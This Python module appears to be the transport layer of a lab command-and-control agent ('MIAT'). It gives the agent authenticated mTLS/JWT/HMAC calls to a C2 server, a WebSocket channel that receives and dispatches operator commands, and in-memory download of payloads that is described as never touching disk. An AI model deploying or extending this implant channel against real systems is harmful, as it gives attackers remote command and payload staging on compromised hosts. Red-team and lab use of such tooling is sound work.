#!/usr/bin/env python3
# agent/transport.py
# =============================================================================
#  MIAT — Transport Layer
#
#  Two classes:
#
#  SecureTransport — synchronous mTLS + JWT + HMAC HTTP client
#    • authenticate()    — exchange agent_id + reg_key for access/refresh JWTs
#    • post(path, data)  — HMAC-signed JSON POST to any C2 API endpoint
#    • get_raw_bytes()   — authenticated binary GET (pull-model payload download)
#    • _ensure_token()   — transparent token refresh before any request
#
#  WebSocketThread — persistent mTLS WebSocket on a background daemon thread
#    • start() / stop()  — lifecycle control
#    • send(dict)        — JSON-encode and deliver a message to the server
#    • send_heartbeat()  — periodic keep-alive with plugin status
#    • connected         — property; True when WS handshake is complete
#    • on_command        — callable set by orchestrator; called on every
#                          inbound 'command' message from the C2 server
# =============================================================================

import hashlib
import hmac as hmac_lib
import json
import logging
import ssl
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional

logger = logging.getLogger('MIAT.Transport')

try:
    import websocket   # websocket-client
    WS_AVAILABLE = True
except ImportError:
    WS_AVAILABLE = False
    logger.warning('websocket-client not installed — WebSocket disabled')


# =============================================================================
# SSL CONTEXT BUILDER
# =============================================================================

def build_ssl_context(
    ca_cert:    str | Path,
    agent_cert: str | Path,
    agent_key:  str | Path,
) -> ssl.SSLContext:
    """
    Build a mutual-TLS SSLContext.

    Both the server certificate (verified against ca_cert) and the client
    certificate (agent_cert + agent_key) are required.  Any connection that
    does not present a valid certificate is refused at the TCP handshake
    before any application data is exchanged.

    Args:
        ca_cert:    Path to the MIAT Certificate Authority PEM file.
        agent_cert: Path to this agent's certificate (signed by the CA).
        agent_key:  Path to the agent certificate's private key.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.verify_mode      = ssl.CERT_REQUIRED
    ctx.check_hostname   = False   # IP SANs used in lab; disable hostname check
    ctx.minimum_version  = ssl.TLSVersion.TLSv1_2
    ctx.load_verify_locations(str(ca_cert))
    ctx.load_cert_chain(certfile=str(agent_cert), keyfile=str(agent_key))
    return ctx


# =============================================================================
# SECURE TRANSPORT
# =============================================================================

class SecureTransport:
    """
    Synchronous mTLS + JWT + HMAC HTTP client.

    All methods are safe to call from both the main asyncio event loop
    (via run_in_executor) and from background threads (WebSocketThread).
    """

    TOKEN_REFRESH_BUFFER = 120   # refresh token 2 minutes before expiry

    def __init__(
        self,
        server_url: str,
        config:     dict,
        ssl_ctx:    ssl.SSLContext,
    ) -> None:
        self.server_url    = server_url.rstrip('/')
        self._agent_id     = config['agent_id']
        self._secret_key   = config['secret_key']
        self._reg_key      = config.get('registration_key', '')
        self._access_token : Optional[str]   = None
        self._refresh_tok  : Optional[str]   = None
        self._token_expiry : float           = 0.0
        self.ssl_ctx       = ssl_ctx
        self._lock         = threading.Lock()

    # ── Authentication ────────────────────────────────────────────────────────

    def authenticate(self) -> None:
        """
        Exchange agent_id + registration_key for access + refresh JWTs.
        Called once at orchestrator startup.  Stores tokens internally.
        Subsequent calls to post() and get_raw_bytes() call _ensure_token()
        which transparently handles refresh rotations.
        """
        payload = json.dumps({
            'agent_id': self._agent_id,
            'reg_key':  self._reg_key,
        }).encode()

        req = urllib.request.Request(
            f'{self.server_url}/api/agent/token/',
            data    = payload,
            headers = {'Content-Type': 'application/json'},
            method  = 'POST',
        )
        try:
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=15) as r:
                data = json.loads(r.read())
        except urllib.error.HTTPError as exc:
            body = exc.read().decode(errors='replace')
            raise RuntimeError(
                f'Authentication failed: HTTP {exc.code} — {body}'
            ) from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(f'Cannot reach C2 server: {exc.reason}') from exc

        self._access_token = data['access']
        self._refresh_tok  = data.get('refresh', '')
        # Compute expiry from token payload (exp claim) or default 15 min
        self._token_expiry = self._parse_expiry(
            self._access_token, default_secs=900
        )
        logger.info(
            f'Authenticated: agent_id={self._agent_id} '
            f'token_valid_until={self._fmt_expiry()}'
        )

    def _refresh_token(self) -> None:
        """Exchange the refresh JWT for a new access token."""
        if not self._refresh_tok:
            self.authenticate()
            return

        payload = json.dumps({'refresh': self._refresh_tok}).encode()
        req = urllib.request.Request(
            f'{self.server_url}/api/agent/token/refresh/',
            data    = payload,
            headers = {'Content-Type': 'application/json'},
            method  = 'POST',
        )
        try:
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=10) as r:
                data = json.loads(r.read())
            self._access_token = data['access']
            self._token_expiry = self._parse_expiry(
                self._access_token, default_secs=900
            )
            logger.debug(f'Token refreshed — valid until {self._fmt_expiry()}')
        except Exception as exc:
            logger.warning(f'Token refresh failed ({exc}), re-authenticating…')
            self.authenticate()

    def _ensure_token(self) -> None:
        """Refresh the access token if it will expire within TOKEN_REFRESH_BUFFER seconds."""
        with self._lock:
            if time.time() >= (self._token_expiry - self.TOKEN_REFRESH_BUFFER):
                self._refresh_token()

    # ── HMAC signing ──────────────────────────────────────────────────────────

    def _sign(self, body: str) -> tuple[str, str]:
        """
        Produce (timestamp_str, hmac_hex) for a given request body string.
        The HMAC covers f'{timestamp}:{body}' to bind the signature to
        both the content and the request time, defeating replay attacks.
        """
        ts  = str(int(time.time()))
        msg = f'{ts}:{body}'.encode('utf-8')
        sig = hmac_lib.new(
            self._secret_key.encode('utf-8'),
            msg,
            hashlib.sha256,
        ).hexdigest()
        return ts, sig

    # ── JSON POST ─────────────────────────────────────────────────────────────

    def post(self, path: str, data: dict) -> dict:
        """
        HMAC-signed authenticated JSON POST.

        Headers added:
            Authorization  : Bearer <access_token>
            X-Timestamp    : Unix timestamp string
            X-Signature    : HMAC-SHA256(secret, f'{timestamp}:{body}')
            Content-Type   : application/json

        Args:
            path: URL path relative to server_url, e.g. '/api/agent/dga/results/'
            data: Dict to serialise as JSON body.

        Returns:
            Parsed JSON response dict.

        Raises:
            RuntimeError: on HTTP 4xx/5xx or connection failure.
        """
        self._ensure_token()

        body    = json.dumps(data)
        ts, sig = self._sign(body)

        req = urllib.request.Request(
            f'{self.server_url}{path}',
            data    = body.encode(),
            headers = {
                'Content-Type':  'application/json',
                'Authorization': f'Bearer {self._access_token}',
                'X-Agent-ID':    self._agent_id,
                'X-Timestamp':   ts,
                'X-Signature':   sig,
            },
            method  = 'POST',
        )
        try:
            with urllib.request.urlopen(req, context=self.ssl_ctx, timeout=30) as r:
                return json.loads(r.read())
        except urllib.error.HTTPError as exc:
            body_err = exc.read().decode(errors='replace')
            raise RuntimeError(
                f'POST {path} failed: HTTP {exc.code} — {body_err}'
            ) from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(f'POST {path} network error: {exc.reason}') from exc

    # ── Binary GET — pull-model payload download ──────────────────────────────

    def get_raw_bytes(self, path: str) -> bytes:
        """
        Authenticated binary GET — returns raw response body as bytes.

        Used exclusively by PayloadBuffer.from_remote_pull() to fetch admin-
        uploaded payload files from the C2 server download endpoint.

        The same mTLS + JWT + HMAC security stack applies:
          • mTLS enforced by ssl_ctx passed to urlopen
          • JWT Bearer token in Authorization header
          • HMAC signature covers empty body + timestamp (GET has no body)

        The response is accumulated via io.BytesIO chunk-reading — the agent
        process never writes anything to disk.

        Args:
            path: URL path, e.g. '/api/agent/payload/7/download/'

        Returns:
            Raw bytes of the downloaded file.

        Raises:
            RuntimeError: on HTTP error or connection failure.
        """
        import io

        self._ensure_token()

        # For GET requests the HMAC body component is empty
        ts, sig = self._sign('')

        req = urllib.request.Request(
            f'{self.server_url}{path}',
            headers = {
                'Authorization': f'Bearer {self._access_token}',
                'X-Agent-ID':    self._agent_id,
                'X-Timestamp':   ts,
                'X-Signature':   sig,
                'Accept':        '*/*',
            },
            method  = 'GET',
        )

        logger.debug(f'GET (binary) {path}')
        try:
            with urllib.request.urlopen(
                req, context=self.ssl_ctx, timeout=120
            ) as r:
                buf = io.BytesIO()
                # Read in 64 KB chunks — prevents loading 35 MB files in one shot
                while True:
                    chunk = r.read(65_536)
                    if not chunk:
                        break
                    buf.write(chunk)
                raw = buf.getvalue()

            # Log the server-provided checksum header for cross-validation
            # (PayloadBuffer.from_remote_pull verifies independently)
            srv_checksum = r.headers.get('X-Payload-Checksum', '')
            if srv_checksum:
                logger.debug(
                    f'Server checksum header: {srv_checksum[:24]}…  '
                    f'received {len(raw)} B'
                )

            return raw

        except urllib.error.HTTPError as exc:
            body = exc.read().decode(errors='replace')
            if exc.code == 410:
                raise RuntimeError(
                    f'Payload at {path} has expired (HTTP 410). '
                    'Upload a new file via the Payload Manager.'
                ) from exc
            raise RuntimeError(
                f'GET {path} failed: HTTP {exc.code} — {body}'
            ) from exc
        except urllib.error.URLError as exc:
            raise RuntimeError(
                f'GET {path} network error: {exc.reason}'
            ) from exc

    # ── Token helpers ─────────────────────────────────────────────────────────

    @staticmethod
    def _parse_expiry(token: str, default_secs: int = 900) -> float:
        """
        Extract the 'exp' claim from a JWT without validating the signature.
        (Validation happens on the server; here we just need the expiry time.)
        Returns a Unix timestamp float.
        """
        import base64
        try:
            parts   = token.split('.')
            padding = '=' * (-len(parts[1]) % 4)
            payload = json.loads(
                base64.urlsafe_b64decode(parts[1] + padding)
            )
            return float(payload['exp'])
        except Exception:
            return time.time() + default_secs

    def _fmt_expiry(self) -> str:
        return datetime.fromtimestamp(
            self._token_expiry, tz=timezone.utc
        ).strftime('%H:%M:%S UTC')

    @property
    def access_token(self) -> Optional[str]:
        return self._access_token


# =============================================================================
# WEBSOCKET THREAD
# =============================================================================

class WebSocketThread(threading.Thread):
    """
    Persistent mTLS WebSocket connection running on a background daemon thread.

    Responsibilities:
      • Maintain a long-lived WebSocket connection to ws(s)://server/ws/agent/<id>/
      • Deliver inbound 'command' messages to the orchestrator via on_command()
      • Expose send() for orchestrator → server messages (heartbeats, task_started, etc.)
      • Auto-reconnect with exponential back-off on disconnection

    Thread safety:
      send() is safe to call from any thread including the asyncio event loop.
      Internally it serialises via a threading.Lock.
    """

    RECONNECT_INITIAL = 2     # seconds before first reconnect attempt
    RECONNECT_MAX     = 60    # maximum back-off ceiling
    PING_INTERVAL     = 20    # websocket-client ping interval

    def __init__(
        self,
        server_url:  str,
        agent_id:    str,
        auth_token:  str,
        ssl_ctx:     ssl.SSLContext,
        on_command:  Callable[[dict], None],
    ) -> None:
        super().__init__(daemon=True, name='WSThread')
        self.server_url = server_url.rstrip('/')
        self.agent_id   = agent_id
        self.auth_token = auth_token
        self.ssl_ctx    = ssl_ctx
        self.on_command = on_command

        self._ws       : Optional['websocket.WebSocketApp'] = None
        self._lock     = threading.Lock()
        self._stop_evt = threading.Event()
        self._connected= threading.Event()

    # ── Public API ────────────────────────────────────────────────────────────

    @property
    def connected(self) -> bool:
        return self._connected.is_set()

    def send(self, data: dict) -> None:
        """JSON-encode and deliver a message to the server."""
        with self._lock:
            if self._ws and self._connected.is_set():
                try:
                    self._ws.send(json.dumps(data))
                except Exception as exc:
                    logger.warning(f'WS send failed: {exc}')

    def send_heartbeat(self, plugin_names: list[str] = None) -> None:
        self.send({
            'type':     'heartbeat',
            'agent_id': self.agent_id,
            'plugins':  plugin_names or [],
            'ts':       time.time(),
        })

    def stop(self) -> None:
        self._stop_evt.set()
        if self._ws:
            try:
                self._ws.close()
            except Exception:
                pass

    # ── Thread entry ──────────────────────────────────────────────────────────

    def run(self) -> None:
        if not WS_AVAILABLE:
            logger.error('websocket-client not installed — cannot start WS thread')
            return

        backoff = self.RECONNECT_INITIAL
        ws_url  = (
            self.server_url
            .replace('https://', 'wss://')
            .replace('http://',  'ws://')
        ) + f'/ws/agent/{self.agent_id}/?token={self.auth_token}'

        while not self._stop_evt.is_set():
            logger.info(f'Connecting WebSocket → {ws_url[:60]}…')
            try:
                app = websocket.WebSocketApp(
                    ws_url,
                    on_open    = self._on_open,
                    on_message = self._on_message,
                    on_error   = self._on_error,
                    on_close   = self._on_close,
                )
                with self._lock:
                    self._ws = app

                app.run_forever(
                    sslopt        = {'context': self.ssl_ctx},
                    ping_interval = self.PING_INTERVAL,
                    ping_timeout  = 10,
                )
            except Exception as exc:
                logger.error(f'WebSocket run_forever exception: {exc}')
            finally:
                self._connected.clear()

            if self._stop_evt.is_set():
                break

            logger.info(f'WebSocket disconnected — reconnecting in {backoff}s')
            self._stop_evt.wait(timeout=backoff)
            backoff = min(backoff * 2, self.RECONNECT_MAX)

    # ── WS event handlers ─────────────────────────────────────────────────────

    def _on_open(self, ws) -> None:
        self._connected.set()
        logger.info(f'WebSocket connected to C2 server')
        ws.send(json.dumps({
            'type':     'connected_ack',
            'agent_id': self.agent_id,
        }))

    def _on_message(self, ws, raw: str) -> None:
        try:
            data = json.loads(raw)
        except json.JSONDecodeError:
            logger.warning(f'Non-JSON WS message ignored: {raw[:80]}')
            return

        msg_type = data.get('type', '')

        if msg_type == 'command':
            # Dispatch to orchestrator's async event loop
            try:
                self.on_command(data)
            except Exception as exc:
                logger.error(f'on_command callback raised: {exc}')

        elif msg_type == 'connected':
            logger.info(f"Server: {data.get('message', 'connected')}")

        elif msg_type == 'heartbeat_ack':
            logger.debug('Heartbeat acknowledged by server')

        elif msg_type == 'task_started_ack':
            logger.debug(f"task_started_ack for {data.get('task_id','?')[:8].upper()}")

        else:
            logger.debug(f'WS msg type={msg_type!r} (unhandled)')

    def _on_error(self, ws, error) -> None:
        self._connected.clear()
        logger.warning(f'WebSocket error: {error}')

    def _on_close(self, ws, code, msg) -> None:
        self._connected.clear()
        logger.info(f'WebSocket closed: code={code} msg={msg}')